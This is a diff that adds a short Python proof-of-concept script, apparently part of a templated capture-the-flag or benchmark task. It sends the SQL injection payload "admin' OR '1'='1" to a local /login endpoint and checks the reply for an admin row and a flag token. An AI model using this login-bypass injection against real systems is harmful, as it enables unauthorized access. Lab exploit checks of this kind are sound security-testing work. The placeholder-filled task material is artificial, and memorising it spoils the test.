@@ -1,0 +1,36 @@
+import argparse
+import requests
+import sys
+
+SUCCESS_SIGNATURE = '__SUCCESS_SIGNATURE__'
+FLAG_TOKEN = '__FLAG_TOKEN__'
+DEFAULT_PARAMS = {'username': "admin' OR '1'='1", 'password': 'irrelevant'}
+
+def exploit(base_url: str) -> bool:
+    url = base_url.rstrip('/') + '/login'
+    try:
+        resp = requests.get(url, params=DEFAULT_PARAMS, timeout=5)
+        resp.raise_for_status()
+    except requests.RequestException as exc:
+        print(f'[sqli-compiler] request failed: {exc}', file=sys.stderr)
+        return False
+    try:
+        payload = resp.json()
+    except ValueError:
+        return False
+    rows = payload.get('rows') or []
+    return any(isinstance(row, dict) and row.get('username') == 'admin' for row in rows) and str(payload.get('flag')) == FLAG_TOKEN
+
+def main() -> None:
+    parser = argparse.ArgumentParser(description='SQLi compiler PoC')
+    parser.add_argument('--base-url', default='http://127.0.0.1:__PORT__')
+    args = parser.parse_args()
+    if exploit(args.base_url):
+        print(SUCCESS_SIGNATURE)
+        print(FLAG_TOKEN)
+        raise SystemExit(0)
+    print('[sqli-compiler] exploit did not succeed', file=sys.stderr)
+    raise SystemExit(1)
+
+if __name__ == '__main__':
+    main()
